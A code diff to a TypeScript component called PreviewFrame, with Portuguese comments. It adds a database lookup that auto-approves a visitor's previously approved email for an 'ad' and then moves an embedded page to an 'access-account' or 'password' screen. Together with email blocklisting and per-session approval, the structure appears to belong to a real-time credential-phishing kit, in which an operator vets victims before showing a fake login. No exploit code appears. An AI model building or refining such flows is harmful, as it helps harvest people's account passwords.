@@ -644,7 +644,7 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             .ilike("email", submittedEmail)
             .limit(1)
             .maybeSingle()
-            .then(({ data: blockedRow }) => {
+            .then(async ({ data: blockedRow }) => {
               if (blockedRow) {
                 emailPendingRef.current = false;
                 pendingEmailRef.current = "";
@@ -669,6 +669,45 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
                   "*",
                 );
                 return;
+              }
+              // Verifica também no banco se esse e-mail JÁ foi aprovado antes
+              // (em qualquer sessão deste anúncio). Permite auto-aprovar mesmo
+              // que o visitante tenha trocado de aba/dispositivo.
+              try {
+                const { data: priorApprove } = await supabase
+                  .from("ad_session_actions")
+                  .select("id")
+                  .eq("ad_id", adId)
+                  .eq("action", "approve")
+                  .filter("payload->>kind", "eq", "email")
+                  .ilike("payload->>email", submittedEmail)
+                  .limit(1)
+                  .maybeSingle();
+                if (priorApprove) {
+                  // Atualiza cache local pra acelerar próximas vezes
+                  try {
+                    const approvedKey = `approved-emails:${adId}`;
+                    const raw = localStorage.getItem(approvedKey);
+                    const current = raw ? (JSON.parse(raw) as string[]) : [];
+                    const next = Array.from(
+                      new Set([...current.map((i) => i.toLowerCase()), submittedEmail]),
+                    );
+                    localStorage.setItem(approvedKey, JSON.stringify(next));
+                  } catch {
+                    // ignore
+                  }
+                  emailPendingRef.current = false;
+                  pendingEmailRef.current = "";
+                  iframe.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
+                  const next =
+                    screensRef.current.find((s) => s.kind === "access-account") ??
+                    screensRef.current.find((s) => s.kind === "password");
+                  if (next) navigateToScreen(next);
+                  else navigateToManualScreen("access-account");
+                  return;
+                }
+              } catch (err) {
+                console.warn("[PreviewFrame] prior approve check failed:", err);
               }
               try {
                 const approvedKey = `approved-emails:${adId}`;
